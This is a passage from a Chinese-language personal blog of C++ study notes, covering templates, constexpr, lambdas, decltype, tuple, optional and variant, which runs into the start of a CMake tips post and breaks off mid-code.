但也正因如此，如果过度使用模板，会导致生成的二进制文件大小剧增，编译变得很慢等。 编译期优化案例 用一个 debug 参数控制是否输出调试信息。 1234567891011121314151617#include &lt;iostream&gt;int sumto(int n, bool debug) &#123; int res = 0; for (int i = 1; i &lt;= n; i++) &#123; res += i; if (debug) std::cout &lt;&lt; i &lt;&lt; \"-th: \" &lt;&lt; res &lt;&lt; std::endl; &#125; return res;&#125;int main() &#123; std::cout &lt;&lt; sumto(4, true) &lt;&lt; std::endl; std::cout &lt;&lt; sumto(4, false) &lt;&lt; std::endl; return 0;&#125; 但是这样 debug 是运行时判断，这样即使是 debug 为 false 也会浪费 CPU 时间。 因此可以把 debug 改成模板参数，这样就是编译期常量。编译器会生成两份函数 sumto&lt;true&gt; 和 sumto&lt;false&gt;。前者保留了调试用的打印语句，后者则完全为性能优化而可以去掉打印语句。 更进一步，可以用C++17的 if constexpr 语法，保证是编译期确定的分支： 123456789101112131415161718#include &lt;iostream&gt;template &lt;bool debug&gt;int sumto(int n) &#123; int res = 0; for (int i = 1; i &lt;= n; i++) &#123; res += i; if constexpr (debug) std::cout &lt;&lt; i &lt;&lt; \"-th: \" &lt;&lt; res &lt;&lt; std::endl; &#125; return res;&#125;int main() &#123; std::cout &lt;&lt; sumto&lt;true&gt;(4) &lt;&lt; std::endl; std::cout &lt;&lt; sumto&lt;false&gt;(4) &lt;&lt; std::endl; return 0;&#125; 编译期常量的限制就在于他不能通过运行时变量组成的表达式来指定。 编译期 constexpr 的表达式，一般是无法调用其他函数的： 如果能保证 isnegative 里都可以在编译期求值，将他前面也标上 constexpr 即可。 12345678910111213141516171819202122#include &lt;iostream&gt;template &lt;bool debug&gt;int sumto(int n) &#123; int res = 0; for (int i = 1; i &lt;= n; i++) &#123; res += i; if constexpr (debug) std::cout &lt;&lt; i &lt;&lt; \"-th: \" &lt;&lt; res &lt;&lt; std::endl; &#125; return res;&#125;constexpr bool isnegative(int n) &#123; return n &lt; 0;&#125;int main() &#123; constexpr bool debug = isnegative(-2014); std::cout &lt;&lt; sumto&lt;debug&gt;(4) &lt;&lt; std::endl; return 0;&#125; constexpr 函数不能调用 non-constexpr 函数。而且 constexpr 函数必须是内联（inline）的，不能分离声明和定义在另一个文件里。标准库的很多函数如 std::min 也是 constexpr 函数，可以放心大胆在模板尖括号内使用。 定义和实现都必须放在头文件 如果我们试着像传统函数那样分离模板函数的声明与实现： 123456// sumto.h#pragma oncetemplate &lt;bool debug&gt;int sumto(int n); 123456789101112131415// sumto.cpp#include \"sumto.h\"#include &lt;iostream&gt;template &lt;bool debug&gt;int sumto(int n) &#123; int res = 0; for (int i = 1; i &lt;= n; i++) &#123; res += i; if constexpr (debug) std::cout &lt;&lt; i &lt;&lt; \"-th: \" &lt;&lt; res &lt;&lt; std::endl; &#125; return res;&#125; 12345678910// main.cpp#include \"sumto.h\"#include &lt;iostream&gt;int main() &#123; constexpr bool debug = true; std::cout &lt;&lt; sumto&lt;debug&gt;(4) &lt;&lt; std::endl; return 0;&#125; 会出现 undefined reference 错误。 因为编译器对模板的编译是惰性的，即只有当前 .cpp 文件用到了这个模板，该模板里的函数才会被定义。 而我们的 sumto.cpp 中没有用到 sumto&lt;&gt; 函数的任何一份定义，所以 main.cpp 里只看到 sumto&lt;&gt; 函数的两份声明，从而出错。 解决方法：在看得见 sumto&lt;&gt; 定义的 sumto.cpp 里，增加两个显式编译模板的声明： 12345678910111213141516#include \"sumto.h\"#include &lt;iostream&gt;template &lt;bool debug&gt;int sumto(int n) &#123; int res = 0; for (int i = 1; i &lt;= n; i++) &#123; res += i; if constexpr (debug) std::cout &lt;&lt; i &lt;&lt; \"-th: \" &lt;&lt; res &lt;&lt; std::endl; &#125; return res;&#125;template int sumto&lt;true&gt;(int n);template int sumto&lt;false&gt;(int n); 延迟编译 只有当 main 调用了模板函数，才会被编译，才会报错。 123456789101112131415161718192021#include &lt;iostream&gt;#include &lt;vector&gt;template &lt;class T&gt;void print(std::vector&lt;T&gt; const &amp;a) &#123; std::cout &lt;&lt; \"&#123;\"; for (size_t i = 0; i &lt; a.size(); i++) &#123; std::cout &lt;&lt; a[i]; if (i != a.size() - 1) std::cout &lt;&lt; \", \"; &#125; std::cout &lt;&lt; \"&#125;\" &lt;&lt; std::endl;&#125;int main() &#123; std::vector&lt;int&gt; a = &#123;1, 4, 2, 8, 5, 7&#125;; print(a); std::vector&lt;double&gt; b = &#123;3.14, 2.718, 0.618&#125;; print(b); return 0;&#125; 另外，inline在如今的编译器，已经是自动优化的一部分，声明不声明对于函数没有意义。关键是要将声明和实现放在一个文件中。 另外，register等优化关键字，也逐渐被优化到编译中，不需要手动声明。 常引用（int const &amp;） const 修饰符的存在，使得 ref 不能被写入（赋值）。这样的好处是更加安全（编译器也能够放心大胆地做自动优化）。 auto 也可以用来定义引用，只需要改成 auto &amp; 即可。 函数返回引用 函数的返回类型也可以是 auto &amp; 或者 auto const &amp;。比如懒汉单例模式： 12345678910111213#include &lt;cstdio&gt;#include &lt;string&gt;#include &lt;map&gt;auto &amp;product_table() &#123; static std::map&lt;std::string, int&gt; instance; return instance;&#125;int main() &#123; product_table().emplace(\"佩奇\", 80); product_table().emplace(\"妈妈\", 100);&#125; const：常值修饰符 与 &amp; 修饰符不同，int const 和 int 可以看做两个不同的类型。不过 int const 是不可写入。 因此 int const &amp; 无非是另一个类型 int const 的引用罢了。这个引用不可写入。 C++ 规定 int &amp;&amp; 能自动转换成 int const &amp;，但不能转换成 int &amp;。 1234void func(int const &amp;i);// 尽管 3 是右值 int &amp;&amp;，但却能传到类型为 int const &amp; 的参数上func(3); 一个方便查看类型名的小工具: 123456789101112131415161718192021222324252627282930313233343536373839#include &lt;iostream&gt;#include &lt;cstdlib&gt;#include &lt;string&gt;#if defined(__GNUC__) || defined(__clang__)#include &lt;cxxabi.h&gt;#endiftemplate &lt;class T&gt;std::string cpp_type_name() &#123; const char *name = typeid(T).name();#if defined(__GNUC__) || defined(__clang__) int status; char *p = abi::__cxa_demangle(name, 0, 0, &amp;status); std::string s = p; std::free(p);#else std::string s = name;#endif if (std::is_const_v&lt;std::remove_reference_t&lt;T&gt;&gt;) s += \" const\"; if (std::is_volatile_v&lt;std::remove_reference_t&lt;T&gt;&gt;) s += \" volatile\"; if (std::is_lvalue_reference_v&lt;T&gt;) s += \" &amp;\"; if (std::is_rvalue_reference_v&lt;T&gt;) s += \" &amp;&amp;\"; return s;&#125;#define SHOW(T) std::cout &lt;&lt; cpp_type_name&lt;T&gt;() &lt;&lt; std::endl;int main() &#123; int a; auto &amp;c = a; auto const &amp;b = a; SHOW(decltype(a)); SHOW(decltype(b)); SHOW(decltype(c));&#125; 可以通过 decltype(变量名) 获取变量定义时候的类型。 注意 decltype(变量名) 和 decltype(表达式) 是不同的。 可以通过 decltype((a)) 来强制编译器使用后者，从而得到 int &amp;。 万能推导（decltype(auto)） 如果一个表达式，我不知道他是个可变引用（int &amp;），常引用（int const &amp;），右值引用（int &amp;&amp;），还是一个普通的值（int）。 想要定义一个和表达式返回类型一样的变量，这时候可以用： decltype(auto) p = func(); 会自动推导为 func() 的返回类型。 decltype(auto) 能够同时适配 auto 和 auto &amp; 返回值类型的两种情况。 123456789101112131415161718192021#include &lt;cstdio&gt;int t;int const &amp;func_ref() &#123; return t;&#125;int const &amp;func_cref() &#123; return t;&#125;int func_val() &#123; return t;&#125;int main() &#123; decltype(auto) a = func_cref(); // int const &amp;a decltype(auto) b = func_ref(); // int &amp;b decltype(auto) c = func_val(); // int c&#125; using：创建类型别名 除了 typedef 外，还可以用 using 创建类型别名： 12typedef std::vector&lt;int&gt; VecInt;using VecInt = std::vector&lt;int&gt;; 以上是等价的。 12typedef int (*PFunc)(int);using PFunc = int(*)(int); 以上是等价的。 一个例子 这是一个实现将两个不同类型 vector 逐元素相加的函数: 用 decltype(T1{} * T2{}) 算出 T1 和 T2 类型相加以后的结果，并做为返回的 vector 容器中的数据类型。 12345678910111213141516171819202122#include &lt;iostream&gt;#include &lt;vector&gt;template &lt;class T1, class T2&gt;auto add(std::vector&lt;T1&gt; const &amp;a, std::vector&lt;T2&gt; const &amp;b) &#123; using T0 = decltype(T1&#123;&#125; + T2&#123;&#125;); std::vector&lt;T0&gt; ret; for (size_t i = 0; i &lt; std::min(a.size(), b.size()); i++) &#123; ret.push_back(a[i] + b[i]); &#125; return ret;&#125;int main() &#123; std::vector&lt;int&gt; a = &#123;2, 3, 4&#125;; std::vector&lt;float&gt; b = &#123;0.5f, 1.0f, 2.0f&#125;; auto c = add(a, b); for (size_t i = 0; i &lt; c.size(); i++) &#123; std::cout &lt;&lt; c[i] &lt;&lt; std::endl; &#125; return 0;&#125; 函数式编程 函数可以作为另一个函数的参数: 123456789101112131415#include &lt;cstdio&gt;void say_hello() &#123; printf(\"Hello!\\n\");&#125;void call_twice(void func()) &#123; func(); func();&#125;int main() &#123; call_twice(say_hello); return 0;&#125; 函数作为模板类型 call_twice 会自动对每个不同的 func 类型编译一遍，从而允许编译器更好地进行自动适配与优化。 123456789101112131415161718192021#include &lt;cstdio&gt;void print_float(float n) &#123; printf(\"Float %f\\n\", n);&#125;void print_int(int n) &#123; printf(\"Int %d\\n\", n);&#125;template &lt;class Func&gt;void call_twice(Func func) &#123; func(0); func(1);&#125;int main() &#123; call_twice(print_float); call_twice(print_int); return 0;&#125; lambda表达式 如果 lambda 表达式不通过 -&gt; 指定返回类型，则和 -&gt; auto 等价，自动根据函数体内的 return 语句决定返回类型，如果没有 return 语句则相当于 -&gt; void。 123456789101112131415#include &lt;cstdio&gt;template &lt;class Func&gt;void call_twice(Func func) &#123; func(0); func(1);&#125;int main() &#123; auto myfunc = [] (int n) &#123; printf(\"Number %d\\n\", n); &#125;; call_twice(myfunc); return 0;&#125; lambda 函数体中，还可以使用定义他的 main 函数中的变量，只需要把方括号 [] 改成 [&amp;] 即可。 函数可以引用定义位置所有的变量，这个特性在函数式编程中称为闭包(closure)。 123456789101112131415#include &lt;iostream&gt;template &lt;class Func&gt;void call_twice(Func func) &#123; std::cout &lt;&lt; func(0) &lt;&lt; std::endl; std::cout &lt;&lt; func(1) &lt;&lt; std::endl;&#125;int main() &#123; auto twice = [] (int n) -&gt; int &#123; return n * 2; &#125;; call_twice(twice); return 0;&#125; [&amp;] 不仅可以读取 main 中的变量，还可以写入 main 中的变量，比如可以通过 counter++ 记录该函数被调用了多少次。 12345678910111213141516171819#include &lt;iostream&gt;template &lt;class Func&gt;void call_twice(Func func) &#123; std::cout &lt;&lt; func(0) &lt;&lt; std::endl; std::cout &lt;&lt; func(1) &lt;&lt; std::endl;&#125;int main() &#123; int fac = 2; int counter = 0; auto twice = [&amp;] (int n) &#123; counter++; return n * fac; &#125;; call_twice(twice); std::cout &lt;&lt; \"调用了 \" &lt;&lt; counter &lt;&lt; \" 次\" &lt;&lt; std::endl; return 0;&#125; 此外，最好把模板参数的 Func 声明为 Func const &amp; 以避免不必要的拷贝。 因为闭包的需要，Func在参数传递复制时，需要将局部变量fac和counter也进行复制传递。所以不加const会使得参数空间为16字节。（64位机器） 1234567891011121314151617181920#include &lt;iostream&gt;template &lt;class Func&gt;void call_twice(Func const &amp;func) &#123; std::cout &lt;&lt; func(0) &lt;&lt; std::endl; std::cout &lt;&lt; func(1) &lt;&lt; std::endl; std::cout &lt;&lt; \"Func 的大小: \" &lt;&lt; sizeof(Func) &lt;&lt; std::endl;&#125;int main() &#123; int fac = 2; int counter = 0; auto twice = [&amp;] (int n) &#123; counter++; return n * fac; &#125;; call_twice(twice); std::cout &lt;&lt; \"调用了 \" &lt;&lt; counter &lt;&lt; \" 次\" &lt;&lt; std::endl; return 0;&#125; 作为返回值 函数可以作为参数，当然也可以作为返回值。由于 lambda 表达式永远是个匿名类型，我们需要将 make_twice 的返回类型声明为 auto 让他自动推导。 1234567891011121314151617181920#include &lt;iostream&gt;template &lt;class Func&gt;void call_twice(Func const &amp;func) &#123; std::cout &lt;&lt; func(0) &lt;&lt; std::endl; std::cout &lt;&lt; func(1) &lt;&lt; std::endl; std::cout &lt;&lt; \"Func 大小: \" &lt;&lt; sizeof(Func) &lt;&lt; std::endl;&#125;auto make_twice() &#123; return [] (int n) &#123; return n * 2; &#125;;&#125;int main() &#123; auto twice = make_twice(); call_twice(twice); return 0;&#125; 如果用 [&amp;]，请保证 lambda 对象的生命周期不超过他捕获的所有引用的寿命。这时，我们可以用 [=] 来捕获，[=] 会给每一个引用了的变量做一份拷贝。性能可能会不如 [&amp;]。 lambda 作为参数：通常用 [&amp;] 存储引用。 lambda 作为返回值：总是用 [=] 存储值。 函数指针 如果你的 lambda 没有捕获任何局部变量，也就是 []，那么不需要用 std::function&lt;int(int)&gt;，直接用函数指针的类型 int(int) 或者 int(*)(int) 即可。 函数指针效率更高一些，但是 [] 就没办法捕获局部变量了（全局变量还是可以的）。 1234567891011121314151617181920#include &lt;iostream&gt;#include &lt;functional&gt;void call_twice(std::function&lt;int(int)&gt; const &amp;func) &#123; std::cout &lt;&lt; func(0) &lt;&lt; std::endl; std::cout &lt;&lt; func(1) &lt;&lt; std::endl; std::cout &lt;&lt; \"Func 大小: \" &lt;&lt; sizeof(func) &lt;&lt; std::endl;&#125;std::function&lt;int(int)&gt; make_twice(int fac) &#123; return [=] (int n) &#123; return n * fac; &#125;;&#125;int main() &#123; auto twice = make_twice(2); call_twice(twice); return 0;&#125; 123456789101112131415#include &lt;iostream&gt;#include &lt;functional&gt;void call_twice(int func(int)) &#123; std::cout &lt;&lt; func(0) &lt;&lt; std::endl; std::cout &lt;&lt; func(1) &lt;&lt; std::endl; std::cout &lt;&lt; \"Func 大小: \" &lt;&lt; sizeof(func) &lt;&lt; std::endl;&#125;int main() &#123; call_twice([] (int n) &#123; return n * 2; &#125;); return 0;&#125; lambda + 模板 可以将 lambda 表达式的参数声明为 auto，声明为 auto 的参数会自动根据调用者给的参数推导类型，基本上和 template &lt;class T&gt; 等价。 auto const &amp; 也是同理，等价于模板函数的 T const &amp;。 带 auto 参数的 lambda 表达式，和模板函数一样，同样会有惰性、多次编译的特性。 123456789101112131415161718192021#include &lt;iostream&gt;#include &lt;functional&gt;void call_twice(auto const &amp;func) &#123; std::cout &lt;&lt; func(3.14f) &lt;&lt; std::endl; std::cout &lt;&lt; func(21) &lt;&lt; std::endl;&#125;int main() &#123; auto twice = [] &lt;class T&gt; (T n) &#123; return n * 2; &#125;; call_twice(twice); return 0;&#125;/* 等价于：auto twice(auto n) &#123; return n * 2;&#125;*/ C++20 函数也可以 auto，lambda 也可以 &lt;class T&gt;。 12345auto wrap(auto f) &#123; return [=] (auto ...args) &#123; return f(f, args...); &#125;;&#125; 举例：yield模式 1234567891011121314151617181920212223242526#include &lt;iostream&gt;#include &lt;vector&gt;template &lt;class Func&gt;void fetch_data(Func const &amp;func) &#123; for (int i = 0; i &lt; 32; i++) &#123; func(i); func(i + 0.5f); &#125;&#125;int main() &#123; std::vector&lt;int&gt; res_i; std::vector&lt;float&gt; res_f; fetch_data([&amp;] (auto const &amp;x) &#123; using T = std::decay_t&lt;decltype(x)&gt;; if constexpr (std::is_same_v&lt;T, int&gt;) &#123; res_i.push_back(x); &#125; else if constexpr (std::is_same_v&lt;T, float&gt;) &#123; res_f.push_back(x); &#125; &#125;); std::cout &lt;&lt; res_i.size() &lt;&lt; std::endl; std::cout &lt;&lt; res_f.size() &lt;&lt; std::endl; return 0;&#125; 这里用了 type_traits 来获取 x 的类型。 decay_t&lt;int const &amp;&gt; = int is_same_v&lt;int, int&gt; = true is_same_v&lt;float, int&gt; = false 举例：立即求值 123456789101112131415#include &lt;iostream&gt;#include &lt;vector&gt;int main() &#123; std::vector&lt;int&gt; arr = &#123;1, 4, 2, 8, 5, 7&#125;; int tofind = 5; int index = [&amp;] &#123; for (int i = 0; i &lt; arr.size(); i++) if (arr[i] == tofind) return i; return -1; &#125;(); std::cout &lt;&lt; index &lt;&lt; std::endl; return 0;&#125; 不需要flag变量。 举例：局部实现递归 123456789101112131415161718#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;set&gt;int main() &#123; std::vector&lt;int&gt; arr = &#123;1, 4, 2, 8, 5, 7, 1, 4&#125;; std::set&lt;int&gt; visited; auto dfs = [&amp;] (auto const &amp;dfs, int index) -&gt; void &#123; if (visited.find(index) == visited.end()) &#123; visited.insert(index); std::cout &lt;&lt; index &lt;&lt; std::endl; int next = arr[index]; dfs(dfs, next); &#125; &#125;; dfs(dfs, 0); return 0;&#125; C++ 新特性 tuple std::tuple&lt;...&gt; 可以将多个不同类型的值打包成一个。尖括号里填各个元素的类型。之后可以用 std::get&lt;0&gt; 获取第0个元素，std::get&lt;1&gt; 获取第1个元素，以此类推（从0开始数数）。 123456789101112131415#include &lt;iostream&gt;#include &lt;tuple&gt;int main() &#123; auto tup = std::tuple&lt;int, float, char&gt;(3, 3.14f, 'h'); int first = std::get&lt;0&gt;(tup); float second = std::get&lt;1&gt;(tup); char third = std::get&lt;2&gt;(tup); std::cout &lt;&lt; first &lt;&lt; std::endl; std::cout &lt;&lt; second &lt;&lt; std::endl; std::cout &lt;&lt; third &lt;&lt; std::endl; return 0;&#125; C++17 的新特性：CTAD。当用于构造函数时，std::tuple&lt;...&gt; 尖括号里的类型可以省略。 123456789101112131415#include &lt;iostream&gt;#include &lt;tuple&gt;int main() &#123; auto tup = std::tuple(3, 3.14f, 'h'); auto first = std::get&lt;0&gt;(tup); auto second = std::get&lt;1&gt;(tup); auto third = std::get&lt;2&gt;(tup); std::cout &lt;&lt; first &lt;&lt; std::endl; std::cout &lt;&lt; second &lt;&lt; std::endl; std::cout &lt;&lt; third &lt;&lt; std::endl; return 0;&#125; 通过 auto 自动推导 get 的返回类型。 结构化绑定 利用一个方括号，里面是变量名列表，即可解包一个 tuple。 12345678910111213#include &lt;iostream&gt;#include &lt;tuple&gt;int main() &#123; auto tup = std::tuple(3, 3.14f, 'h'); auto [first, second, third] = tup; std::cout &lt;&lt; first &lt;&lt; std::endl; std::cout &lt;&lt; second &lt;&lt; std::endl; std::cout &lt;&lt; third &lt;&lt; std::endl; return 0;&#125; 结构化绑定也支持绑定为引用，这样相当于解包出来的 x, y, ... 都是 auto &amp; 推导出来的引用类型。对引用的修改可以影响到原 tuple 内的值。 1234567891011121314#include &lt;iostream&gt;#include &lt;tuple&gt;int main() &#123; auto tup = std::tuple(3, 3.14f, 'h'); auto &amp;[first, second, third] = tup; std::cout &lt;&lt; std::get&lt;0&gt;(tup) &lt;&lt; std::endl; first = 42; std::cout &lt;&lt; std::get&lt;0&gt;(tup) &lt;&lt; std::endl; return 0;&#125; 万能推导 注意一下万能推导的 decltype(auto)，由于历史原因，他对应的结构化绑定是 auto &amp;&amp;。 12auto &amp;&amp;[x, y, ...] = tup; // 正确！decltype(auto) [x, y, ...] = tup; // 错误！ 1234567891011121314#include &lt;iostream&gt;#include &lt;tuple&gt;int main() &#123; auto tup = std::tuple(3, 3.14f, 'h'); auto &amp;&amp;[first, second, third] = tup; std::cout &lt;&lt; std::get&lt;0&gt;(tup) &lt;&lt; std::endl; first = 42; std::cout &lt;&lt; std::get&lt;0&gt;(tup) &lt;&lt; std::endl; return 0;&#125; 结构化绑定不仅可以解包 std::tuple，还可以解包任意用户自定义类。 12345678910111213141516#include &lt;iostream&gt;#include &lt;tuple&gt;struct MyClass &#123; int x; float y;&#125;;int main() &#123; MyClass mc = &#123;42, 3.14f&#125;; auto [x, y] = mc; std::cout &lt;&lt; x &lt;&lt; \", \" &lt;&lt; y &lt;&lt; std::endl; return 0;&#125; optional 1234567891011121314151617#include &lt;iostream&gt;#include &lt;optional&gt;#include &lt;cmath&gt;std::optional&lt;float&gt; mysqrt(float x) &#123; if (x &gt;= 0.f) &#123; return std::sqrt(x); &#125; else &#123; return std::nullopt; &#125;&#125;int main() &#123; auto ret = mysqrt(-3.14f); printf(\"成功！结果为：%f\\n\", ret.value()); return 0;&#125; value_or() 方便地指定一个缺省值： 1234567891011121314151617#include &lt;iostream&gt;#include &lt;optional&gt;#include &lt;cmath&gt;std::optional&lt;float&gt; mysqrt(float x) &#123; if (x &gt;= 0.f) &#123; return std::sqrt(x); &#125; else &#123; return std::nullopt; &#125;&#125;int main() &#123; auto ret = mysqrt(-3.14f); printf(\"成功！结果为：%f\\n\", ret.value_or()); return 0;&#125; value() 会检测是否为空，空则抛出异常 std::bad_optional_access： 1234567891011121314151617#include &lt;iostream&gt;#include &lt;optional&gt;#include &lt;cmath&gt;std::optional&lt;float&gt; mysqrt(float x) &#123; if (x &gt;= 0.f) &#123; return std::sqrt(x); &#125; else &#123; return std::nullopt; &#125;&#125;int main() &#123; auto ret = mysqrt(-3.14f); printf(\"成功！结果为：%f\\n\", ret.value()); return 0;&#125; 除了 ret.value() 之外还可以用 *ret 获取 optional 容器中的值，不过operator*() 不检测是否为空，不会抛出异常，更加高效，但是要注意安全。 在 if 的条件表达式中，其实可以直接写 if (ret)，他和 if (ret.has_value()) 等价。 nullopt nullopt 则模仿 nullptr，但是他更安全，且符合 RAII 思想，当设为 nullopt 时会自动释放内部的对象。和 unique_ptr 的区别在于他的对象存储在栈上，效率更高。 123456789101112131415161718192021#include &lt;iostream&gt;#include &lt;optional&gt;#include &lt;cmath&gt;std::optional&lt;float&gt; mysqrt(float x) &#123; if (x &gt;= 0.f) &#123; return std::sqrt(x); &#125; else &#123; return std::nullopt; &#125;&#125;int main() &#123; auto ret = mysqrt(-3.14f); if (ret.has_value()) &#123; printf(\"成功！结果为：%f\\n\", *ret); &#125; else &#123; printf(\"失败！找不到平方根！\\n\"); &#125; return 0;&#125; variant 安全的 union。和 union 相比，variant 符合 RAII 思想，更加安全易用。 image-20220608224818039 要获取某个类型的值，比如要获取 int 用 std::get。如果当前 variant 里不是这个类型，就会抛出异常：std::bad_variant_access。 12345678910111213141516#include &lt;iostream&gt;#include &lt;variant&gt;int main() &#123; std::variant&lt;int, float&gt; v = 3; std::cout &lt;&lt; std::get&lt;int&gt;(v) &lt;&lt; std::endl; // 3 std::cout &lt;&lt; std::get&lt;0&gt;(v) &lt;&lt; std::endl; // 3 v = 3.14f; std::cout &lt;&lt; std::get&lt;float&gt;(v) &lt;&lt; std::endl; // 3.14f std::cout &lt;&lt; std::get&lt;int&gt;(v) &lt;&lt; std::endl; // 运行时错误 return 0;&#125; 可以用 std::holds_alternative 判断当前里面存储的是不是 int。 123456789101112131415161718#include &lt;iostream&gt;#include &lt;variant&gt;void print(std::variant&lt;int, float&gt; const &amp;v) &#123; if (std::holds_alternative&lt;int&gt;(v)) &#123; std::cout &lt;&lt; std::get&lt;int&gt;(v) &lt;&lt; std::endl; &#125; else if (std::holds_alternative&lt;float&gt;(v)) &#123; std::cout &lt;&lt; std::get&lt;float&gt;(v) &lt;&lt; std::endl; &#125;&#125;int main() &#123; std::variant&lt;int, float&gt; v = 3; print(v); v = 3.14f; print(v); return 0;&#125; 除了这个之外，还可以用成员方法 index() 获取当前是参数列表中的第几个类型。 123456789101112131415161718#include &lt;iostream&gt;#include &lt;variant&gt;void print(std::variant&lt;int, float&gt; const &amp;v) &#123; if (v.index() == 0) &#123; std::cout &lt;&lt; std::get&lt;0&gt;(v) &lt;&lt; std::endl; &#125; else if (v.index() == 1) &#123; std::cout &lt;&lt; std::get&lt;1&gt;(v) &lt;&lt; std::endl; &#125;&#125;int main() &#123; std::variant&lt;int, float&gt; v = 3; print(v); v = 3.14f; print(v); return 0;&#125; 批量匹配 std::visit 如果你的 if-else 每个分支长得都差不多（除了 std::get&lt;&gt; 的类型不一样以外），可以考虑用 std::visit，他会自动用相应的类型，调用你的 lambda。 12345678910111213141516#include &lt;iostream&gt;#include &lt;variant&gt;void print(std::variant&lt;int, float&gt; const &amp;v) &#123; std::visit([&amp;] (auto const &amp;t) &#123; std::cout &lt;&lt; t &lt;&lt; std::endl; &#125;, v);&#125;int main() &#123; std::variant&lt;int, float&gt; v = 3; print(v); v = 3.14f; print(v); return 0;&#125; 这里用到了带 auto 的 lambda，利用了他具有多次编译的特性，实现编译多个分支的效果。 std::visit、std::variant 的这种模式称为静态多态，和虚函数、抽象类的动态多态相对。静态多态的优点是：性能开销小，存储大小固定。缺点是：类型固定，不能运行时扩充。 1234567891011121314151617181920212223#include &lt;iostream&gt;#include &lt;variant&gt;void print(std::variant&lt;int, float&gt; const &amp;v) &#123; std::visit([&amp;] (auto const &amp;t) &#123; std::cout &lt;&lt; t &lt;&lt; std::endl; &#125;, v);&#125;auto add(std::variant&lt;int, float&gt; const &amp;v1, std::variant&lt;int, float&gt; const &amp;v2) &#123; std::variant&lt;int, float&gt; ret; std::visit([&amp;] (auto const &amp;t1, auto const &amp;t2) &#123; ret = t1 + t2; &#125;, v1, v2); return ret;&#125;int main() &#123; std::variant&lt;int, float&gt; v = 3; print(add(v, 3.14f)); return 0;&#125; 所以如果 variant 有 n 个类型，那 lambda 就要被编译 n² 次，编译可能会变慢。但是标准库能保证运行时是 O(1) 的（他们用函数指针实现分支，不是暴力 if-else）。 std::visit里面的 lambda 可以有返回值： 12345678910111213141516171819202122#include &lt;iostream&gt;#include &lt;variant&gt;void print(std::variant&lt;int, float&gt; const &amp;v) &#123; std::visit([&amp;] (auto const &amp;t) &#123; std::cout &lt;&lt; t &lt;&lt; std::endl; &#125;, v);&#125;auto add(std::variant&lt;int, float&gt; const &amp;v1, std::variant&lt;int, float&gt; const &amp;v2) &#123; return std::visit([&amp;] (auto const &amp;t1, auto const &amp;t2) -&gt; std::variant&lt;int, float&gt; &#123; return t1 + t2; &#125;, v1, v2);&#125;int main() &#123; std::variant&lt;int, float&gt; v = 3; print(add(v, 3.14f)); return 0;&#125;","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"C++","slug":"Notes/C","permalink":"https://racleray.github.io/categories/Notes/C/"}],"tags":[{"name":"C++","slug":"C","permalink":"https://racleray.github.io/tags/C/"},{"name":"Template","slug":"Template","permalink":"https://racleray.github.io/tags/Template/"}],"author":"HeRui"},{"title":"CMake Tips","slug":"CMake-Tips","date":"2023-05-21T11:11:52.000Z","updated":"2024-01-09T10:19:03.624Z","comments":true,"path":"posts/50880878.html","link":"","permalink":"https://racleray.github.io/posts/50880878.html","excerpt":"CMake 笔记","text":"Cmake 为什么需要构建系统（Makefile） 当更新了hello.cpp时只会重新编译hello.o，而不需要把main.o也重新编译一遍 能够自动并行地发起对hello.cpp和main.cpp的编译，加快编译速度（make -j） 用通配符批量生成构建规则，避免针对每个.cpp和.o重复写 g++ 命令（%.o: %.cpp） 但坏处也很明显： make 在 Unix 类系统上是通用的，但在 Windows 则不然。 需要准确地指明每个项目之间的依赖关系，有头文件时特别头疼。 make 的语法非常简单，不像 shell 或 python 可以做很多判断等。 不同的编译器有不同的 flag 规则，为 g++ 准备的参数可能对 MSVC 不适用。 构建系统的构建系统（CMake） 为了解决 make 的以上问题，跨平台的 CMake 应运而生！ 只需要写一份 CMakeLists.txt，他就能够在调用时生成当前系统所支持的构建系统。 CMake 可以自动检测源文件和头文件之间的依赖关系，导出到 Makefile 里。 CMake 具有相对高级的语法，内置的函数能够处理 configure，install 等常见需求。 CMake 3.x （现代）相比 2.x （古代）有所不同： 现代 CMake 和古代 CMake 相比，使用更方便，功能更强大。 CMake 可以自动检测当前的编译器需要添加哪些 flag。比如 OpenMP，只需要在 CMakeLists.txt 中指明 target_link_libraries(a.out OpenMP::OpenMP_CXX) 即可。 CMake 官方文档 CMake “菜谱” C++ 核心开发规范 CMake 的命令行调用 现代 CMake 提供了更方便的 -B 和 --build 指令，不同平台，统一命令： 123456# 第一步称为配置阶段（configure），这时只检测环境并生成构建规则cmake -B build # 在源码目录用 -B 直接创建 build 目录并生成 build/Makefile# 第二步称为构建阶段（build），这时才实际调用编译器来编译代码cmake --build build -j4 # 自动调用本地的构建系统在 build 里构建，即：make -C build -j4sudo cmake --build build --target install # 调用本地的构建系统执行 install 这个目标 cmake -B build 免去了先创建 build 目录再切换进去再指定源码目录的麻烦。 cmake --build build 统一了不同平台（Linux 上会调用 make，Windows 上调用 devenv.exe）。 配置阶段可以通过 -D 设置缓存变量。第二次配置时，之前的 -D 添加仍然会被保留。 12cmake -B build -DCMAKE_BUILD_TYPE=Release # 设置构建模式为发布模式（开启全部优化）cmake -B build # 第二次配置时没有 -D 参数，但是之前的 -D 设置的变量都会被保留 -G 选项：指定要用的生成器。Linux 系统上的 CMake 默认用是 Unix Makefiles 生成器；Windows 系统默认是 Visual Studio 2019 生成器；MacOS 系统默认是 Xcode 生成器。 可以用 -G 参数改用别的生成器，例如 cmake -GNinja 会生成 Ninja 这个构建系统的构建规则。Ninja 是一个高性能，跨平台的构建系统，Linux、Windows、MacOS 上都可以用。Ninja 则是专为性能优化的构建系统，他和 CMake 结合都是行业标准了。 性能上：Ninja &gt; Makefile &gt; MSBuild。 1cmake -GNinja -B build 读取当前目录的 CMakeLists.txt，并在 build 文件夹下生成 build/Makefile： cmake -Bbuild 让 make 读取 build/Makefile，并开始构建 a.out： make -C build 以下命令和上一个等价，但更跨平台： cmake --build build 执行生成的 build/a.out. 示例： hello.cpp 12345#include &lt;cstdio&gt;void hello() &#123; printf(\"Hello, world\\n\");&#125; main.cpp 12345678#include &lt;cstdio&gt;void hello();int main() &#123; hello(); return 0;&#125; 多种编译组织方式 普通编译 1234cmake_minimum_required(VERSION 3.12)project(hellocmake LANGUAGES CXX)add_executable(a.out main.cpp hello.cpp) 静态库 除了 add_executable 可以生成可执行文件外，还可以通过 add_library 生成库文件。 生成静态库 hellolib.a。 要在某个可执行文件中使用该库，只需要： target_link_libraries(a.out PUBLIC hellolib) # 为 a.out 链接刚刚制作的库 hellolib.a 123456cmake_minimum_required(VERSION 